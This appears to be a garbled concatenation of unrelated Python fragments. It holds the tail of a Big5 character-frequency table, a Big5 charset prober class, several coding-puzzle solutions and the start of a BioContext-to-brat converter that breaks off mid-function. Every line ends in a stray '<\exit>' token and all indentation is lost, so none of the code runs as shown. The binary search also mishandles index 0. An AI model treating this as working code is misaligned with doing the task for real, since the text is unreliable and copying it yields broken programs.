10467,10468,10469,10470,10471,10472,10473,10474,10475,10476,10477,10478,10479,10480,10481,10482,<\exit>
10483,10484,10485,10486,10487,10488,10489,10490,10491,10492,10493,10494,10495,10496,10497,10498,<\exit>
10499,10500,10501,10502,10503,10504,10505,4938,10506,10507,10508,10509,10510,2552,10511,10512,<\exit>
10513,10514,10515,10516,3447,10517,10518,10519,10520,10521,10522,10523,10524,10525,10526,10527,<\exit>
10528,10529,10530,10531,10532,10533,10534,10535,10536,10537,10538,10539,10540,10541,10542,10543,<\exit>
4482,10544,4939,10545,10546,10547,10548,10549,10550,10551,10552,10553,10554,10555,10556,10557,<\exit>
10558,10559,10560,10561,10562,10563,10564,10565,10566,10567,3676,4483,10568,10569,10570,10571,<\exit>
10572,3448,10573,10574,10575,10576,10577,10578,10579,10580,10581,10582,10583,10584,10585,10586,<\exit>
10587,10588,10589,10590,10591,10592,10593,10594,10595,10596,10597,10598,10599,10600,10601,10602,<\exit>
10603,10604,10605,10606,10607,10608,10609,10610,10611,10612,10613,10614,10615,10616,10617,10618,<\exit>
10619,10620,10621,10622,10623,10624,10625,10626,10627,4484,10628,10629,10630,10631,10632,4940,<\exit>
10633,10634,10635,10636,10637,10638,10639,10640,10641,10642,10643,10644,10645,10646,10647,10648,<\exit>
10649,10650,10651,10652,10653,10654,10655,10656,4941,10657,10658,10659,2599,10660,10661,10662,<\exit>
10663,10664,10665,10666,3089,10667,10668,10669,10670,10671,10672,10673,10674,10675,10676,10677,<\exit>
10678,10679,10680,4942,10681,10682,10683,10684,10685,10686,10687,10688,10689,10690,10691,10692,<\exit>
10693,10694,10695,10696,10697,4485,10698,10699,10700,10701,10702,10703,10704,4943,10705,3677,<\exit>
10706,10707,10708,10709,10710,10711,10712,4944,10713,10714,10715,10716,10717,10718,10719,10720,<\exit>
10721,10722,10723,10724,10725,10726,10727,10728,4945,10729,10730,10731,10732,10733,10734,10735,<\exit>
10736,10737,10738,10739,10740,10741,10742,10743,10744,10745,10746,10747,10748,10749,10750,10751,<\exit>
10752,10753,10754,10755,10756,10757,10758,10759,10760,10761,4946,10762,10763,10764,10765,10766,<\exit>
10767,4947,4948,10768,10769,10770,10771,10772,10773,10774,10775,10776,10777,10778,10779,10780,<\exit>
10781,10782,10783,10784,10785,10786,10787,10788,10789,10790,10791,10792,10793,10794,10795,10796,<\exit>
10797,10798,10799,10800,10801,10802,10803,10804,10805,10806,10807,10808,10809,10810,10811,10812,<\exit>
10813,10814,10815,10816,10817,10818,10819,10820,10821,10822,10823,10824,10825,10826,10827,10828,<\exit>
10829,10830,10831,10832,10833,10834,10835,10836,10837,10838,10839,10840,10841,10842,10843,10844,<\exit>
10845,10846,10847,10848,10849,10850,10851,10852,10853,10854,10855,10856,10857,10858,10859,10860,<\exit>
10861,10862,10863,10864,10865,10866,10867,10868,10869,10870,10871,10872,10873,10874,10875,10876,<\exit>
10877,10878,4486,10879,10880,10881,10882,10883,10884,10885,4949,10886,10887,10888,10889,10890,<\exit>
10891,10892,10893,10894,10895,10896,10897,10898,10899,10900,10901,10902,10903,10904,10905,10906,<\exit>
10907,10908,10909,10910,10911,10912,10913,10914,10915,10916,10917,10918,10919,4487,10920,10921,<\exit>
10922,10923,10924,10925,10926,10927,10928,10929,10930,10931,10932,4950,10933,10934,10935,10936,<\exit>
10937,10938,10939,10940,10941,10942,10943,10944,10945,10946,10947,10948,10949,4488,10950,10951,<\exit>
10952,10953,10954,10955,10956,10957,10958,10959,4190,10960,10961,10962,10963,10964,10965,10966,<\exit>
10967,10968,10969,10970,10971,10972,10973,10974,10975,10976,10977,10978,10979,10980,10981,10982,<\exit>
10983,10984,10985,10986,10987,10988,10989,10990,10991,10992,10993,10994,10995,10996,10997,10998,<\exit>
10999,11000,11001,11002,11003,11004,11005,11006,3960,11007,11008,11009,11010,11011,11012,11013,<\exit>
11014,11015,11016,11017,11018,11019,11020,11021,11022,11023,11024,11025,11026,11027,11028,11029,<\exit>
11030,11031,11032,4951,11033,11034,11035,11036,11037,11038,11039,11040,11041,11042,11043,11044,<\exit>
11045,11046,11047,4489,11048,11049,11050,11051,4952,11052,11053,11054,11055,11056,11057,11058,<\exit>
4953,11059,11060,11061,11062,11063,11064,11065,11066,11067,11068,11069,11070,11071,4954,11072,<\exit>
11073,11074,11075,11076,11077,11078,11079,11080,11081,11082,11083,11084,11085,11086,11087,11088,<\exit>
11089,11090,11091,11092,11093,11094,11095,11096,11097,11098,11099,11100,11101,11102,11103,11104,<\exit>
11105,11106,11107,11108,11109,11110,11111,11112,11113,11114,11115,3808,11116,11117,11118,11119,<\exit>
11120,11121,11122,11123,11124,11125,11126,11127,11128,11129,11130,11131,11132,11133,11134,4955,<\exit>
11135,11136,11137,11138,11139,11140,11141,11142,11143,11144,11145,11146,11147,11148,11149,11150,<\exit>
11151,11152,11153,11154,11155,11156,11157,11158,11159,11160,11161,4956,11162,11163,11164,11165,<\exit>
11166,11167,11168,11169,11170,11171,11172,11173,11174,11175,11176,11177,11178,11179,11180,4957,<\exit>
11181,11182,11183,11184,11185,11186,4958,11187,11188,11189,11190,11191,11192,11193,11194,11195,<\exit>
11196,11197,11198,11199,11200,3678,11201,11202,11203,11204,11205,11206,4191,11207,11208,11209,<\exit>
11210,11211,11212,11213,11214,11215,11216,11217,11218,11219,11220,11221,11222,11223,11224,11225,<\exit>
11226,11227,11228,11229,11230,11231,11232,11233,11234,11235,11236,11237,11238,11239,11240,11241,<\exit>
11242,11243,11244,11245,11246,11247,11248,11249,11250,11251,4959,11252,11253,11254,11255,11256,<\exit>
11257,11258,11259,11260,11261,11262,11263,11264,11265,11266,11267,11268,11269,11270,11271,11272,<\exit>
11273,11274,11275,11276,11277,11278,11279,11280,11281,11282,11283,11284,11285,11286,11287,11288,<\exit>
11289,11290,11291,11292,11293,11294,11295,11296,11297,11298,11299,11300,11301,11302,11303,11304,<\exit>
11305,11306,11307,11308,11309,11310,11311,11312,11313,11314,3679,11315,11316,11317,11318,4490,<\exit>
11319,11320,11321,11322,11323,11324,11325,11326,11327,11328,11329,11330,11331,11332,11333,11334,<\exit>
11335,11336,11337,11338,11339,11340,11341,11342,11343,11344,11345,11346,11347,4960,11348,11349,<\exit>
11350,11351,11352,11353,11354,11355,11356,11357,11358,11359,11360,11361,11362,11363,11364,11365,<\exit>
11366,11367,11368,11369,11370,11371,11372,11373,11374,11375,11376,11377,3961,4961,11378,11379,<\exit>
11380,11381,11382,11383,11384,11385,11386,11387,11388,11389,11390,11391,11392,11393,11394,11395,<\exit>
11396,11397,4192,11398,11399,11400,11401,11402,11403,11404,11405,11406,11407,11408,11409,11410,<\exit>
11411,4962,11412,11413,11414,11415,11416,11417,11418,11419,11420,11421,11422,11423,11424,11425,<\exit>
11426,11427,11428,11429,11430,11431,11432,11433,11434,11435,11436,11437,11438,11439,11440,11441,<\exit>
11442,11443,11444,11445,11446,11447,11448,11449,11450,11451,11452,11453,11454,11455,11456,11457,<\exit>
11458,11459,11460,11461,11462,11463,11464,11465,11466,11467,11468,11469,4963,11470,11471,4491,<\exit>
11472,11473,11474,11475,4964,11476,11477,11478,11479,11480,11481,11482,11483,11484,11485,11486,<\exit>
11487,11488,11489,11490,11491,11492,4965,11493,11494,11495,11496,11497,11498,11499,11500,11501,<\exit>
11502,11503,11504,11505,11506,11507,11508,11509,11510,11511,11512,11513,11514,11515,11516,11517,<\exit>
11518,11519,11520,11521,11522,11523,11524,11525,11526,11527,11528,11529,3962,11530,11531,11532,<\exit>
11533,11534,11535,11536,11537,11538,11539,11540,11541,11542,11543,11544,11545,11546,11547,11548,<\exit>
11549,11550,11551,11552,11553,11554,11555,11556,11557,11558,11559,11560,11561,11562,11563,11564,<\exit>
4193,4194,11565,11566,11567,11568,11569,11570,11571,11572,11573,11574,11575,11576,11577,11578,<\exit>
11579,11580,11581,11582,11583,11584,11585,11586,11587,11588,11589,11590,11591,4966,4195,11592,<\exit>
11593,11594,11595,11596,11597,11598,11599,11600,11601,11602,11603,11604,3090,11605,11606,11607,<\exit>
11608,11609,11610,4967,11611,11612,11613,11614,11615,11616,11617,11618,11619,11620,11621,11622,<\exit>
11623,11624,11625,11626,11627,11628,11629,11630,11631,11632,11633,11634,11635,11636,11637,11638,<\exit>
11639,11640,11641,11642,11643,11644,11645,11646,11647,11648,11649,11650,11651,11652,11653,11654,<\exit>
11655,11656,11657,11658,11659,11660,11661,11662,11663,11664,11665,11666,11667,11668,11669,11670,<\exit>
11671,11672,11673,11674,4968,11675,11676,11677,11678,11679,11680,11681,11682,11683,11684,11685,<\exit>
11686,11687,11688,11689,11690,11691,11692,11693,3809,11694,11695,11696,11697,11698,11699,11700,<\exit>
11701,11702,11703,11704,11705,11706,11707,11708,11709,11710,11711,11712,11713,11714,11715,11716,<\exit>
11717,11718,3553,11719,11720,11721,11722,11723,11724,11725,11726,11727,11728,11729,11730,4969,<\exit>
11731,11732,11733,11734,11735,11736,11737,11738,11739,11740,4492,11741,11742,11743,11744,11745,<\exit>
11746,11747,11748,11749,11750,11751,11752,4970,11753,11754,11755,11756,11757,11758,11759,11760,<\exit>
11761,11762,11763,11764,11765,11766,11767,11768,11769,11770,11771,11772,11773,11774,11775,11776,<\exit>
11777,11778,11779,11780,11781,11782,11783,11784,11785,11786,11787,11788,11789,11790,4971,11791,<\exit>
11792,11793,11794,11795,11796,11797,4972,11798,11799,11800,11801,11802,11803,11804,11805,11806,<\exit>
11807,11808,11809,11810,4973,11811,11812,11813,11814,11815,11816,11817,11818,11819,11820,11821,<\exit>
11822,11823,11824,11825,11826,11827,11828,11829,11830,11831,11832,11833,11834,3680,3810,11835,<\exit>
11836,4974,11837,11838,11839,11840,11841,11842,11843,11844,11845,11846,11847,11848,11849,11850,<\exit>
11851,11852,11853,11854,11855,11856,11857,11858,11859,11860,11861,11862,11863,11864,11865,11866,<\exit>
11867,11868,11869,11870,11871,11872,11873,11874,11875,11876,11877,11878,11879,11880,11881,11882,<\exit>
11883,11884,4493,11885,11886,11887,11888,11889,11890,11891,11892,11893,11894,11895,11896,11897,<\exit>
11898,11899,11900,11901,11902,11903,11904,11905,11906,11907,11908,11909,11910,11911,11912,11913,<\exit>
11914,11915,4975,11916,11917,11918,11919,11920,11921,11922,11923,11924,11925,11926,11927,11928,<\exit>
11929,11930,11931,11932,11933,11934,11935,11936,11937,11938,11939,11940,11941,11942,11943,11944,<\exit>
11945,11946,11947,11948,11949,4976,11950,11951,11952,11953,11954,11955,11956,11957,11958,11959,<\exit>
11960,11961,11962,11963,11964,11965,11966,11967,11968,11969,11970,11971,11972,11973,11974,11975,<\exit>
11976,11977,11978,11979,11980,11981,11982,11983,11984,11985,11986,11987,4196,11988,11989,11990,<\exit>
11991,11992,4977,11993,11994,11995,11996,11997,11998,11999,12000,12001,12002,12003,12004,12005,<\exit>
12006,12007,12008,12009,12010,12011,12012,12013,12014,12015,12016,12017,12018,12019,12020,12021,<\exit>
12022,12023,12024,12025,12026,12027,12028,12029,12030,12031,12032,12033,12034,12035,12036,12037,<\exit>
12038,12039,12040,12041,12042,12043,12044,12045,12046,12047,12048,12049,12050,12051,12052,12053,<\exit>
12054,12055,12056,12057,12058,12059,12060,12061,4978,12062,12063,12064,12065,12066,12067,12068,<\exit>
12069,12070,12071,12072,12073,12074,12075,12076,12077,12078,12079,12080,12081,12082,12083,12084,<\exit>
12085,12086,12087,12088,12089,12090,12091,12092,12093,12094,12095,12096,12097,12098,12099,12100,<\exit>
12101,12102,12103,12104,12105,12106,12107,12108,12109,12110,12111,12112,12113,12114,12115,12116,<\exit>
12117,12118,12119,12120,12121,12122,12123,4979,12124,12125,12126,12127,12128,4197,12129,12130,<\exit>
12131,12132,12133,12134,12135,12136,12137,12138,12139,12140,12141,12142,12143,12144,12145,12146,<\exit>
12147,12148,12149,12150,12151,12152,12153,12154,4980,12155,12156,12157,12158,12159,12160,4494,<\exit>
12161,12162,12163,12164,3811,12165,12166,12167,12168,12169,4495,12170,12171,4496,12172,12173,<\exit>
12174,12175,12176,3812,12177,12178,12179,12180,12181,12182,12183,12184,12185,12186,12187,12188,<\exit>
12189,12190,12191,12192,12193,12194,12195,12196,12197,12198,12199,12200,12201,12202,12203,12204,<\exit>
12205,12206,12207,12208,12209,12210,12211,12212,12213,12214,12215,12216,12217,12218,12219,12220,<\exit>
12221,4981,12222,12223,12224,12225,12226,12227,12228,12229,12230,12231,12232,12233,12234,12235,<\exit>
4982,12236,12237,12238,12239,12240,12241,12242,12243,12244,12245,4983,12246,12247,12248,12249,<\exit>
4984,12250,12251,12252,12253,12254,12255,12256,12257,12258,12259,12260,12261,12262,12263,12264,<\exit>
4985,12265,4497,12266,12267,12268,12269,12270,12271,12272,12273,12274,12275,12276,12277,12278,<\exit>
12279,12280,12281,12282,12283,12284,12285,12286,12287,4986,12288,12289,12290,12291,12292,12293,<\exit>
12294,12295,12296,2473,12297,12298,12299,12300,12301,12302,12303,12304,12305,12306,12307,12308,<\exit>
12309,12310,12311,12312,12313,12314,12315,12316,12317,12318,12319,3963,12320,12321,12322,12323,<\exit>
12324,12325,12326,12327,12328,12329,12330,12331,12332,4987,12333,12334,12335,12336,12337,12338,<\exit>
12339,12340,12341,12342,12343,12344,12345,12346,12347,12348,12349,12350,12351,12352,12353,12354,<\exit>
12355,12356,12357,12358,12359,3964,12360,12361,12362,12363,12364,12365,12366,12367,12368,12369,<\exit>
12370,3965,12371,12372,12373,12374,12375,12376,12377,12378,12379,12380,12381,12382,12383,12384,<\exit>
12385,12386,12387,12388,12389,12390,12391,12392,12393,12394,12395,12396,12397,12398,12399,12400,<\exit>
12401,12402,12403,12404,12405,12406,12407,12408,4988,12409,12410,12411,12412,12413,12414,12415,<\exit>
12416,12417,12418,12419,12420,12421,12422,12423,12424,12425,12426,12427,12428,12429,12430,12431,<\exit>
12432,12433,12434,12435,12436,12437,12438,3554,12439,12440,12441,12442,12443,12444,12445,12446,<\exit>
12447,12448,12449,12450,12451,12452,12453,12454,12455,12456,12457,12458,12459,12460,12461,12462,<\exit>
12463,12464,4989,12465,12466,12467,12468,12469,12470,12471,12472,12473,12474,12475,12476,12477,<\exit>
12478,12479,12480,4990,12481,12482,12483,12484,12485,12486,12487,12488,12489,4498,12490,12491,<\exit>
12492,12493,12494,12495,12496,12497,12498,12499,12500,12501,12502,12503,12504,12505,12506,12507,<\exit>
12508,12509,12510,12511,12512,12513,12514,12515,12516,12517,12518,12519,12520,12521,12522,12523,<\exit>
12524,12525,12526,12527,12528,12529,12530,12531,12532,12533,12534,12535,12536,12537,12538,12539,<\exit>
12540,12541,12542,12543,12544,12545,12546,12547,12548,12549,12550,12551,4991,12552,12553,12554,<\exit>
12555,12556,12557,12558,12559,12560,12561,12562,12563,12564,12565,12566,12567,12568,12569,12570,<\exit>
12571,12572,12573,12574,12575,12576,12577,12578,3036,12579,12580,12581,12582,12583,3966,12584,<\exit>
12585,12586,12587,12588,12589,12590,12591,12592,12593,12594,12595,12596,12597,12598,12599,12600,<\exit>
12601,12602,12603,12604,12605,12606,12607,12608,12609,12610,12611,12612,12613,12614,12615,12616,<\exit>
12617,12618,12619,12620,12621,12622,12623,12624,12625,12626,12627,12628,12629,12630,12631,12632,<\exit>
12633,12634,12635,12636,12637,12638,12639,12640,12641,12642,12643,12644,12645,12646,4499,12647,<\exit>
12648,12649,12650,12651,12652,12653,12654,12655,12656,12657,12658,12659,12660,12661,12662,12663,<\exit>
12664,12665,12666,12667,12668,12669,12670,12671,12672,12673,12674,12675,12676,12677,12678,12679,<\exit>
12680,12681,12682,12683,12684,12685,12686,12687,12688,12689,12690,12691,12692,12693,12694,12695,<\exit>
12696,12697,12698,4992,12699,12700,12701,12702,12703,12704,12705,12706,12707,12708,12709,12710,<\exit>
12711,12712,12713,12714,12715,12716,12717,12718,12719,12720,12721,12722,12723,12724,12725,12726,<\exit>
12727,12728,12729,12730,12731,12732,12733,12734,12735,12736,12737,12738,12739,12740,12741,12742,<\exit>
12743,12744,12745,12746,12747,12748,12749,12750,12751,12752,12753,12754,12755,12756,12757,12758,<\exit>
12759,12760,12761,12762,12763,12764,12765,12766,12767,12768,12769,12770,12771,12772,12773,12774,<\exit>
12775,12776,12777,12778,4993,2175,12779,12780,12781,12782,12783,12784,12785,12786,4500,12787,<\exit>
12788,12789,12790,12791,12792,12793,12794,12795,12796,12797,12798,12799,12800,12801,12802,12803,<\exit>
12804,12805,12806,12807,12808,12809,12810,12811,12812,12813,12814,12815,12816,12817,12818,12819,<\exit>
12820,12821,12822,12823,12824,12825,12826,4198,3967,12827,12828,12829,12830,12831,12832,12833,<\exit>
12834,12835,12836,12837,12838,12839,12840,12841,12842,12843,12844,12845,12846,12847,12848,12849,<\exit>
12850,12851,12852,12853,12854,12855,12856,12857,12858,12859,12860,12861,4199,12862,12863,12864,<\exit>
12865,12866,12867,12868,12869,12870,12871,12872,12873,12874,12875,12876,12877,12878,12879,12880,<\exit>
12881,12882,12883,12884,12885,12886,12887,4501,12888,12889,12890,12891,12892,12893,12894,12895,<\exit>
12896,12897,12898,12899,12900,12901,12902,12903,12904,12905,12906,12907,12908,12909,12910,12911,<\exit>
12912,4994,12913,12914,12915,12916,12917,12918,12919,12920,12921,12922,12923,12924,12925,12926,<\exit>
12927,12928,12929,12930,12931,12932,12933,12934,12935,12936,12937,12938,12939,12940,12941,12942,<\exit>
12943,12944,12945,12946,12947,12948,12949,12950,12951,12952,12953,12954,12955,12956,1772,12957,<\exit>
12958,12959,12960,12961,12962,12963,12964,12965,12966,12967,12968,12969,12970,12971,12972,12973,<\exit>
12974,12975,12976,12977,12978,12979,12980,12981,12982,12983,12984,12985,12986,12987,12988,12989,<\exit>
12990,12991,12992,12993,12994,12995,12996,12997,4502,12998,4503,12999,13000,13001,13002,13003,<\exit>
4504,13004,13005,13006,13007,13008,13009,13010,13011,13012,13013,13014,13015,13016,13017,13018,<\exit>
13019,13020,13021,13022,13023,13024,13025,13026,13027,13028,13029,3449,13030,13031,13032,13033,<\exit>
13034,13035,13036,13037,13038,13039,13040,13041,13042,13043,13044,13045,13046,13047,13048,13049,<\exit>
13050,13051,13052,13053,13054,13055,13056,13057,13058,13059,13060,13061,13062,13063,13064,13065,<\exit>
13066,13067,13068,13069,13070,13071,13072,13073,13074,13075,13076,13077,13078,13079,13080,13081,<\exit>
13082,13083,13084,13085,13086,13087,13088,13089,13090,13091,13092,13093,13094,13095,13096,13097,<\exit>
13098,13099,13100,13101,13102,13103,13104,13105,13106,13107,13108,13109,13110,13111,13112,13113,<\exit>
13114,13115,13116,13117,13118,3968,13119,4995,13120,13121,13122,13123,13124,13125,13126,13127,<\exit>
4505,13128,13129,13130,13131,13132,13133,13134,4996,4506,13135,13136,13137,13138,13139,4997,<\exit>
13140,13141,13142,13143,13144,13145,13146,13147,13148,13149,13150,13151,13152,13153,13154,13155,<\exit>
13156,13157,13158,13159,4998,13160,13161,13162,13163,13164,13165,13166,13167,13168,13169,13170,<\exit>
13171,13172,13173,13174,13175,13176,4999,13177,13178,13179,13180,13181,13182,13183,13184,13185,<\exit>
13186,13187,13188,13189,13190,13191,13192,13193,13194,13195,13196,13197,13198,13199,13200,13201,<\exit>
13202,13203,13204,13205,13206,5000,13207,13208,13209,13210,13211,13212,13213,13214,13215,13216,<\exit>
13217,13218,13219,13220,13221,13222,13223,13224,13225,13226,13227,4200,5001,13228,13229,13230,<\exit>
13231,13232,13233,13234,13235,13236,13237,13238,13239,13240,3969,13241,13242,13243,13244,3970,<\exit>
13245,13246,13247,13248,13249,13250,13251,13252,13253,13254,13255,13256,13257,13258,13259,13260,<\exit>
13261,13262,13263,13264,13265,13266,13267,13268,3450,13269,13270,13271,13272,13273,13274,13275,<\exit>
13276,5002,13277,13278,13279,13280,13281,13282,13283,13284,13285,13286,13287,13288,13289,13290,<\exit>
13291,13292,13293,13294,13295,13296,13297,13298,13299,13300,13301,13302,3813,13303,13304,13305,<\exit>
13306,13307,13308,13309,13310,13311,13312,13313,13314,13315,13316,13317,13318,13319,13320,13321,<\exit>
13322,13323,13324,13325,13326,13327,13328,4507,13329,13330,13331,13332,13333,13334,13335,13336,<\exit>
13337,13338,13339,13340,13341,5003,13342,13343,13344,13345,13346,13347,13348,13349,13350,13351,<\exit>
13352,13353,13354,13355,13356,13357,13358,13359,13360,13361,13362,13363,13364,13365,13366,13367,<\exit>
5004,13368,13369,13370,13371,13372,13373,13374,13375,13376,13377,13378,13379,13380,13381,13382,<\exit>
13383,13384,13385,13386,13387,13388,13389,13390,13391,13392,13393,13394,13395,13396,13397,13398,<\exit>
13399,13400,13401,13402,13403,13404,13405,13406,13407,13408,13409,13410,13411,13412,13413,13414,<\exit>
13415,13416,13417,13418,13419,13420,13421,13422,13423,13424,13425,13426,13427,13428,13429,13430,<\exit>
13431,13432,4508,13433,13434,13435,4201,13436,13437,13438,13439,13440,13441,13442,13443,13444,<\exit>
13445,13446,13447,13448,13449,13450,13451,13452,13453,13454,13455,13456,13457,5005,13458,13459,<\exit>
13460,13461,13462,13463,13464,13465,13466,13467,13468,13469,13470,4509,13471,13472,13473,13474,<\exit>
13475,13476,13477,13478,13479,13480,13481,13482,13483,13484,13485,13486,13487,13488,13489,13490,<\exit>
13491,13492,13493,13494,13495,13496,13497,13498,13499,13500,13501,13502,13503,13504,13505,13506,<\exit>
13507,13508,13509,13510,13511,13512,13513,13514,13515,13516,13517,13518,13519,13520,13521,13522,<\exit>
13523,13524,13525,13526,13527,13528,13529,13530,13531,13532,13533,13534,13535,13536,13537,13538,<\exit>
13539,13540,13541,13542,13543,13544,13545,13546,13547,13548,13549,13550,13551,13552,13553,13554,<\exit>
13555,13556,13557,13558,13559,13560,13561,13562,13563,13564,13565,13566,13567,13568,13569,13570,<\exit>
13571,13572,13573,13574,13575,13576,13577,13578,13579,13580,13581,13582,13583,13584,13585,13586,<\exit>
13587,13588,13589,13590,13591,13592,13593,13594,13595,13596,13597,13598,13599,13600,13601,13602,<\exit>
13603,13604,13605,13606,13607,13608,13609,13610,13611,13612,13613,13614,13615,13616,13617,13618,<\exit>
13619,13620,13621,13622,13623,13624,13625,13626,13627,13628,13629,13630,13631,13632,13633,13634,<\exit>
13635,13636,13637,13638,13639,13640,13641,13642,5006,13643,13644,13645,13646,13647,13648,13649,<\exit>
13650,13651,5007,13652,13653,13654,13655,13656,13657,13658,13659,13660,13661,13662,13663,13664,<\exit>
13665,13666,13667,13668,13669,13670,13671,13672,13673,13674,13675,13676,13677,13678,13679,13680,<\exit>
13681,13682,13683,13684,13685,13686,13687,13688,13689,13690,13691,13692,13693,13694,13695,13696,<\exit>
13697,13698,13699,13700,13701,13702,13703,13704,13705,13706,13707,13708,13709,13710,13711,13712,<\exit>
13713,13714,13715,13716,13717,13718,13719,13720,13721,13722,13723,13724,13725,13726,13727,13728,<\exit>
13729,13730,13731,13732,13733,13734,13735,13736,13737,13738,13739,13740,13741,13742,13743,13744,<\exit>
13745,13746,13747,13748,13749,13750,13751,13752,13753,13754,13755,13756,13757,13758,13759,13760,<\exit>
13761,13762,13763,13764,13765,13766,13767,13768,13769,13770,13771,13772,13773,13774,3273,13775,<\exit>
13776,13777,13778,13779,13780,13781,13782,13783,13784,13785,13786,13787,13788,13789,13790,13791,<\exit>
13792,13793,13794,13795,13796,13797,13798,13799,13800,13801,13802,13803,13804,13805,13806,13807,<\exit>
13808,13809,13810,13811,13812,13813,13814,13815,13816,13817,13818,13819,13820,13821,13822,13823,<\exit>
13824,13825,13826,13827,13828,13829,13830,13831,13832,13833,13834,13835,13836,13837,13838,13839,<\exit>
13840,13841,13842,13843,13844,13845,13846,13847,13848,13849,13850,13851,13852,13853,13854,13855,<\exit>
13856,13857,13858,13859,13860,13861,13862,13863,13864,13865,13866,13867,13868,13869,13870,13871,<\exit>
13872,13873,13874,13875,13876,13877,13878,13879,13880,13881,13882,13883,13884,13885,13886,13887,<\exit>
13888,13889,13890,13891,13892,13893,13894,13895,13896,13897,13898,13899,13900,13901,13902,13903,<\exit>
13904,13905,13906,13907,13908,13909,13910,13911,13912,13913,13914,13915,13916,13917,13918,13919,<\exit>
13920,13921,13922,13923,13924,13925,13926,13927,13928,13929,13930,13931,13932,13933,13934,13935,<\exit>
13936,13937,13938,13939,13940,13941,13942,13943,13944,13945,13946,13947,13948,13949,13950,13951,<\exit>
13952,13953,13954,13955,13956,13957,13958,13959,13960,13961,13962,13963,13964,13965,13966,13967,<\exit>
13968,13969,13970,13971,13972)<\exit>
from .mbcharsetprober import MultiByteCharSetProber<\exit>
from .codingstatemachine import CodingStateMachine<\exit>
from .chardistribution import Big5DistributionAnalysis<\exit>
from .mbcssm import Big5SMModel<\exit>
class Big5Prober(MultiByteCharSetProber):<\exit>
def __init__(self):<\exit>
MultiByteCharSetProber.__init__(self)<\exit>
self._mCodingSM = CodingStateMachine(Big5SMModel)<\exit>
self._mDistributionAnalyzer = Big5DistributionAnalysis()<\exit>
self.reset()<\exit>
def get_charset_name(self):<\exit>
return "Big5"<\exit>
class Solution(object):<\exit>
def solve(self, cipher):<\exit>
A = list(cipher)<\exit>
A = map(ord, A)<\exit>
n = len(A)<\exit>
a = -1<\exit>
for i in xrange(n - 1, 0, -1):<\exit>
if A[i - 1] < A[i]:<\exit>
a = i - 1<\exit>
break<\exit>
else:<\exit>
return "no answer"<\exit>
b = -1<\exit>
for i in xrange(n - 1, a, -1):<\exit>
if A[i] > A[a]:<\exit>
b = i<\exit>
break<\exit>
else:<\exit>
return "no answer"<\exit>
A[a], A[b] = A[b], A[a]<\exit>
A = A[:a + 1] + A[n - 1:a:-1]<\exit>
return "".join(map(chr, A))<\exit>
if __name__ == "__main__":<\exit>
import sys<\exit>
f = open("1.in", "r")<\exit>
solution = Solution()<\exit>
testcases = int(f.readline().strip())<\exit>
for t in xrange(testcases):<\exit>
cipher = f.readline().strip()<\exit>
s = "%s\n" % (solution.solve(cipher))<\exit>
print s,<\exit>
from decimal import *<\exit>
class Solution:<\exit>
def binaryRepresentation(self, n):<\exit>
dec_part = ""<\exit>
if "." in n:<\exit>
int_part, dec_part = n.split(".")<\exit>
getcontext().prec = len(dec_part)+1<\exit>
dec_part = "."+dec_part<\exit>
if not self.is_representable(Decimal(dec_part)):<\exit>
return "ERROR"<\exit>
else:<\exit>
int_part = n<\exit>
a = self.natural_num_to_bin(int(int_part))<\exit>
b = self.fraction_to_bin(Decimal(dec_part))<\exit>
if a == "":<\exit>
a = "0"<\exit>
if b == "":<\exit>
return a<\exit>
else:<\exit>
return a+"."+b<\exit>
@staticmethod<\exit>
def natural_num_to_bin(n):<\exit>
sb = []<\exit>
while n > 0:<\exit>
sb.append(n&1)<\exit>
n >>= 1<\exit>
return "".join(map(str, reversed(sb)))<\exit>
@staticmethod<\exit>
def fraction_to_bin(n):<\exit>
sb = []<\exit>
while n > 0:<\exit>
if len(sb) > 32:<\exit>
return "ERROR"<\exit>
n *= Decimal(2)<\exit>
cur = int(n)<\exit>
sb.append(cur)<\exit>
n -= Decimal(cur)<\exit>
return "".join(map(str, sb))<\exit>
@staticmethod<\exit>
def is_representable(frac):<\exit>
while True:<\exit>
temp = str(frac).rstrip("0")<\exit>
if temp.endswith("."):<\exit>
return True<\exit>
if not temp.endswith("5"):<\exit>
return False<\exit>
frac *= Decimal(2)<\exit>
if __name__ == "__main__":<\exit>
assert Solution().binaryRepresentation("0.72") == "ERROR"<\exit>
assert Solution().binaryRepresentation("0.125") == "0.001"<\exit>
assert Solution().binaryRepresentation("0.6418459415435791") == "ERROR"<\exit>
class Solution:<\exit>
def binarySearch(self, nums, target):<\exit>
l = 0<\exit>
h = len(nums)<\exit>
while l < h:<\exit>
mid = (l+h)/2<\exit>
if nums[mid] == target:<\exit>
while mid >= 0 and nums[mid-1] == nums[mid]: mid -= 1<\exit>
return mid<\exit>
elif nums[mid] < target:<\exit>
l = mid+1<\exit>
else:<\exit>
h = mid<\exit>
return -1<\exit>
import sys<\exit>
import re<\exit>
import os<\exit>
options = None<\exit>
DEFAULT_INPUT = 'entities-anatomy.csv'<\exit>
BIOCONTEXT_ID_RE = re.compile(r'^([0-9]+|PMC[0-9]+\.[0-9]+\.[0-9])+$')<\exit>
def argparser():<\exit>
import argparse<\exit>
ap=argparse.ArgumentParser(description='Convert BioContext data ' +<\exit>
'into brat-flavored standoff.')<\exit>
ap.add_argument('-d', '--directory', default=None,<\exit>
help='Output directory (default output to STDOUT)')<\exit>
ap.add_argument('-e', '--entitytype', default='Anatomical_entity',<\exit>
help='Type to assign to annotations.')<\exit>
ap.add_argument('-f', '--file', default=DEFAULT_INPUT,<\exit>
help='BioContext data (default "'+DEFAULT_INPUT+'")')<\exit>
ap.add_argument('-n', '--no-norm', default=False, action='store_true',<\exit>
help='Do not output normalization annotations')<\exit>
ap.add_argument('-o', '--outsuffix', default='ann',<\exit>
help='Suffix to add to output files (default "ann")')<\exit>
ap.add_argument('-v', '--verbose', default=False, action='store_true',<\exit>
help='Verbose output')<\exit>
ap.add_argument('id', metavar='ID/FILE', nargs='+',<\exit>
help='IDs of documents for which to extract annotations.')<\exit>
return ap<\exit>
def read_ids(fn):<\exit>
ids = set()<\exit>
with open(fn, 'rU') as f:<\exit>
for l in f:<\exit>
l = l.rstrip('\n')<\exit>
if not BIOCONTEXT_ID_RE.match(l):<\exit>
print >> sys.stderr, 'Warning: ID %s not in expected format' % l<\exit>
ids.add(l)<\exit>
return ids<\exit>
def get_ids(items):<\exit>
combined = set()<\exit>
for item in items:<\exit>
if BIOCONTEXT_ID_RE.match(item):<\exit>
combined.add(item)<\exit>
else:<\exit>
combined |= read_ids(item)<\exit>
return combined<\exit>
def convert_line(l, converted):<\exit>
try:<\exit>
doc_id, id_, eid, start, end, text, group = l.split('\t')<\exit>
